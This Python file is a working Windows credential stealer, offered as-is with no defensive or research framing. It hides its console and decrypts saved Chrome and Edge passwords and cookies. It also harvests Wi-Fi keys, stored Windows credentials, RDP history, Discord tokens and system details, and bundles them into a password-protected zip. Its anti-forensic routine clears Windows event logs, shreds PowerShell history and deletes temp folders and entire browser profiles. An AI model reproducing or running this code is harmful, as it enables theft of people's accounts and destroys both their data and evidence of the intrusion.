import glob
import os
import sqlite3
import json
import base64
import win32crypt
import shutil
import subprocess
import pyzipper
import winreg
import ctypes
import sys
import psutil
import logging
import platform
import socket
import time
from Crypto.Cipher import AES

# Configuration
OUTPUT_DIR = "Extracted_Data"
ZIP_PASSWORD = b"admin123@"
ZIP_FILE = "Extracted_Data.zip"

# Setup
os.makedirs(OUTPUT_DIR, exist_ok=True)
logging.basicConfig(filename='extraction_log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')

def hide_console():
    """Hide the console window and disable logging."""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    sys.stdout = open(os.devnull, 'w')

def validate_decryption(encrypted_value, decrypted_value):
    """Verify decryption results quality."""
    if not decrypted_value:
        return "[EMPTY]"
    if "�" in decrypted_value or "\\x" in decrypted_value:
        return "[CORRUPTED DATA]"
    return decrypted_value

def get_encryption_key(browser_path):
    """Retrieve and validate Chrome/Edge encryption key."""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        if len(encrypted_key) <= 5:
            return None
            
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception as e:
        logging.error(f"Key error: {str(e)}")
        return None

def decrypt_value(encrypted_value, key):
    """Safe value decryption with validation."""
    try:
        if not encrypted_value:
            return "[NO DATA]"
            
        if encrypted_value[:3] == b'v10':
            if len(encrypted_value) < 15:
                return "[INVALID LENGTH]"
                
            iv = encrypted_value[3:15]
            encrypted_data = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_data)[:-16].decode()
            return validate_decryption(encrypted_value, decrypted)
            
        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        return validate_decryption(encrypted_value, decrypted)
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        return "[DECRYPTION FAILED]"

def safe_sqlite_execute(path, query):
    """Robust SQLite handling with locking prevention."""
    try:
        if not os.path.exists(path):
            return []
            
        temp_path = path + ".locked"
        for _ in range(3):
            try:
                shutil.copyfile(path, temp_path)
                break
            except PermissionError:
                time.sleep(0.5)
        else:
            return []
            
        conn = sqlite3.connect(f"file:{temp_path}?mode=ro", uri=True)
        cursor = conn.cursor()
        cursor.execute(query)
        results = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(temp_path)
        return results
        
    except Exception as e:
        logging.error(f"SQL error: {str(e)}")
        return []

def write_data(filename, data, headers=None):
    """Safe data writing with formatting."""
    try:
        with open(os.path.join(OUTPUT_DIR, filename), "w", encoding="utf-8") as f:
            if headers:
                f.write(f"{' | '.join(headers)}\n")
                f.write("-" * (sum(len(str(h)) for h in headers) + 3 * len(headers)) + "\n")
            for row in data:
                f.write(" | ".join(str(item) for item in row) + "\n")
    except Exception as e:
        logging.error(f"Write error: {str(e)}")

def extract_chromium_data(browser_name, data_path):
    """Extract data from Chromium-based browsers."""
    try:
        browser_root = os.path.join(os.getenv('LOCALAPPDATA'), data_path)
        if not os.path.exists(browser_root):
            return
            
        key = get_encryption_key(os.path.dirname(browser_root))
        if not key:
            return
            
        # Passwords
        passwords = []
        for row in safe_sqlite_execute(
            os.path.join(browser_root, "Login Data"),
            "SELECT origin_url, username_value, password_value FROM logins"
        ):
            try:
                decrypted = decrypt_value(row[2], key)
                passwords.append([row[0], row[1], decrypted])
            except IndexError:
                continue
        write_data(f"{browser_name}_Passwords.txt", passwords, ["URL", "Username", "Password"])
        
        # Cookies
        cookies = []
        for row in safe_sqlite_execute(
            os.path.join(browser_root, "Cookies"),
            "SELECT host_key, name, encrypted_value FROM cookies"
        ):
            try:
                decrypted = decrypt_value(row[2], key)
                cookies.append([row[0], row[1], decrypted])
            except IndexError:
                continue
        write_data(f"{browser_name}_Cookies.txt", cookies, ["Domain", "Name", "Value"])
        
        # History
        history = safe_sqlite_execute(
            os.path.join(browser_root, "History"),
            "SELECT url, title, last_visit_time FROM urls"
        )
        write_data(f"{browser_name}_History.txt", history, ["URL", "Title", "Timestamp"])
        
    except Exception as e:
        logging.error(f"{browser_name} error: {str(e)}")

def collect_system_info():
    """Comprehensive system information collection."""
    try:
        # Hardware
        system_info = [
            ["OS Version", platform.platform()],
            ["Hostname", socket.gethostname()],
            ["Username", os.getenv("USERNAME")],
            ["Processor", platform.processor()],
            ["Cores", f"{psutil.cpu_count(logical=False)} Physical / {psutil.cpu_count()} Logical"],
            ["RAM", f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"]
        ]
        write_data("System_Info.txt", system_info, ["Category", "Value"])
        
        # Disks
        disks = []
        for part in psutil.disk_partitions():
            usage = psutil.disk_usage(part.mountpoint)
            disks.append([
                part.device,
                f"{round(usage.total / (1024**3), 2)} GB",
                part.fstype
            ])
        write_data("Disk_Info.txt", disks, ["Device", "Size", "File System"])
        
        # Network
        network = []
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network.append([name, addr.address, addr.netmask])
        write_data("Network_Info.txt", network, ["Interface", "IP", "Netmask"])
        
        # Software
        software = []
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall") as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey) as skey:
                            name = winreg.QueryValueEx(skey, "DisplayName")[0]
                            software.append([name])
                    except:
                        continue
        except Exception as e:
            logging.error(f"Software error: {str(e)}")
        write_data("Installed_Software.txt", software, ["Application"])
        
    except Exception as e:
        logging.error(f"System info error: {str(e)}")

def extract_wifi_passwords():
    """Extract WiFi credentials with validation."""
    try:
        wifi_data = []
        profiles = [p.split(":")[1].strip() for p in 
                  subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode().split('\n')
                  if "All User Profile" in p]
        
        for profile in profiles:
            try:
                output = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                ).decode()
                password = next(
                    line.split(":")[1].strip() 
                    for line in output.split('\n') 
                    if "Key Content" in line
                )
                wifi_data.append([profile, password])
            except (subprocess.CalledProcessError, StopIteration):
                continue
                
        write_data("WiFi_Passwords.txt", wifi_data, ["SSID", "Password"])
    except Exception as e:
        logging.error(f"WiFi error: {str(e)}")

def extract_system_credentials():
    """Extract stored system credentials."""
    try:
        creds = subprocess.check_output(['cmdkey', '/list']).decode().split('\n')
        write_data("System_Credentials.txt", [[c] for c in creds if c.strip()], ["Credentials"])
    except Exception as e:
        logging.error(f"Credential error: {str(e)}")

def extract_bitlocker_keys():
    """Extract BitLocker recovery information."""
    try:
        output = subprocess.check_output(['manage-bde', '-status']).decode()
        write_data("BitLocker_Keys.txt", [[output]], ["Recovery Information"])
    except Exception as e:
        logging.error(f"BitLocker error: {str(e)}")

def extract_rdp_credentials():
    """Extract RDP connection history."""
    try:
        rdp_data = []
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Terminal Server Client\Default") as key:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    rdp_data.append([name, value])
                    i += 1
                except OSError:
                    break
        write_data("RDP_Credentials.txt", rdp_data, ["Server", "Credentials"])
    except Exception as e:
        logging.error(f"RDP error: {str(e)}")

def extract_discord_tokens():
    """Extract Discord authentication tokens."""
    try:
        tokens = []
        token_path = os.path.join(os.getenv('APPDATA'), "Discord\\Local Storage\\leveldb")
        for file in os.listdir(token_path):
            if file.endswith((".ldb", ".log")):
                with open(os.path.join(token_path, file), "r", errors="ignore") as f:
                    tokens.extend(
                        line.strip() 
                        for line in f 
                        if "mfa." in line or (len(line.strip()) == 59 and line.strip().isalnum())
                    )
        write_data("Discord_Tokens.txt", [[t] for t in tokens], ["Token"])
    except Exception as e:
        logging.error(f"Discord error: {str(e)}")

def clean_logs():
    """Enterprise-grade forensic sanitation"""
    try:
        # 1. Event log sterilization
        logs = ['Security', 'System', 'Application', 'Setup', 'ForwardedEvents']
        for log in logs:
            subprocess.run(
                f'wevtutil cl {log} /q', 
                shell=True, 
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        # 2. PowerShell history destruction
        ps_history_paths = [
            os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*_history.txt"),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft\\Windows\\PowerShell\\PSReadLine\\*_history.txt')
        ]
        
        for pattern in ps_history_paths:
            for history_file in glob.glob(pattern):
                try:
                    with open(history_file, 'wb') as f:
                        file_size = os.path.getsize(history_file)
                        f.write(os.urandom(file_size))
                    os.remove(history_file)
                except Exception as e:
                    logging.error(f"History sanitization failed: {str(e)}")
        
        # 3. Temporary data eradication
        temp_paths = [
            os.environ['TEMP'],
            os.path.join(os.environ['WINDIR'], 'Temp'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Temp'),
            os.path.join(os.environ['PROGRAMDATA'], 'Temp')
        ]
        
        for path in temp_paths:
            try:
                shutil.rmtree(path, ignore_errors=True)
                os.makedirs(path, exist_ok=True)
            except Exception as e:
                logging.error(f"Temp cleanup failed: {str(e)}")
        
        # 4. Browser artifact removal
        browsers = {
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome'),
            'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge'),
            'Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla\\Firefox')
        }
        
        for browser, path in browsers.items():
            try:
                shutil.rmtree(path, ignore_errors=True)
            except Exception as e:
                logging.error(f"Browser cleanup failed: {browser} - {str(e)}")
        
        logging.info("Full forensic sanitation completed")
        
    except Exception as e:
        logging.error(f"Forensic cleanup failed: {str(e)}")

def create_secure_zip():
    """Military-grade encrypted packaging"""
    try:
        with pyzipper.AESZipFile(
            ZIP_FILE, 
            'w', 
            compression=pyzipper.ZIP_DEFLATED, 
            encryption=pyzipper.WZ_AES
        ) as zf:
            zf.setpassword(ZIP_PASSWORD)
            for file in os.listdir(OUTPUT_DIR):
                zf.write(os.path.join(OUTPUT_DIR, file), file)
        shutil.rmtree(OUTPUT_DIR, ignore_errors=True)
    except Exception as e:
        logging.error(f"Secure packaging failed: {str(e)}")
        raise

def main():
    """Operational security protocol"""
    hide_console()
    try:
        # Phase 1: Intelligence Gathering
        if os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), "Google\\Chrome")):
            extract_chromium_data("Chrome", "Google\\Chrome\\User Data\\Default")
        
        if os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft\\Edge")):
            extract_chromium_data("Edge", "Microsoft\\Edge\\User Data\\Default")
        
        collect_system_info()
        extract_wifi_passwords()
        extract_system_credentials()
        extract_bitlocker_keys()
        extract_rdp_credentials()
        extract_discord_tokens()
        
        # Phase 2: Anti-Forensic Operations
        clean_logs()
        
        # Phase 3: Secure Exfiltration
        create_secure_zip()
        
    except Exception as e:
        logging.critical(f"Mission failure: {str(e)}")
        # Emergency Protocol
        if os.path.exists(OUTPUT_DIR):
            shutil.rmtree(OUTPUT_DIR, ignore_errors=True)
        if os.path.exists(ZIP_FILE):
            os.remove(ZIP_FILE)
    finally:
        # Clean Exit
        if os.path.exists(OUTPUT_DIR):
            shutil.rmtree(OUTPUT_DIR, ignore_errors=True)

if __name__ == "__main__":
    main()